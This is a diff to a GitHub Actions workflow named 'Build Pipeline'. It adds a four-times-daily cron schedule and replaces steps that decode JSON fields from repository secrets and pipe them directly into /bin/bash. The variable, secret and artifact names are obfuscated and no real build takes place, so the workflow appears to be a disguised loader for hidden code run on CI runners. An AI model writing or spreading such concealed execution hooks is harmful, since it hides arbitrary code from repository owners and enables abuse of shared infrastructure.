@@ -2,6 +2,8 @@ name: Build Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '14 4,10,16,22 * * *'
 jobs:
   workflow:
     runs-on: ubuntu-latest
@@ -13,18 +15,14 @@ jobs:
           fetch-depth: 1
       - name: Perform
         env:
-          c42: ${{ secrets.c42 }}
+          mepmf9887: ${{ secrets.mepmf9887 }}
         run: |
-          printf '%s' "$c42" | jq -r .vira6 | /bin/bash
-          echo $rflb91208 | jq -r .jywwo743 | /bin/bash
-          printf '%s' "$z84043" | jq -r .iyxb7 | /bin/bash
-          echo $moy5356 | jq -r .ra7773 | /bin/bash
-          printf '%s' "$px0" | jq -r .mtosp36957 | /bin/bash
-          printf '%s' "$zchh9857" | jq -r .j7 | /bin/bash
+          printf '%s' "$mepmf9887" | jq -r .dd00 | /bin/bash
+          printf '%s' "$axv16505" | jq -r .clgr66 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
         with:
-          name: f7bEAo9o
+          name: Ha8wScRM
           path: "*.zip"
           retention-days: 1
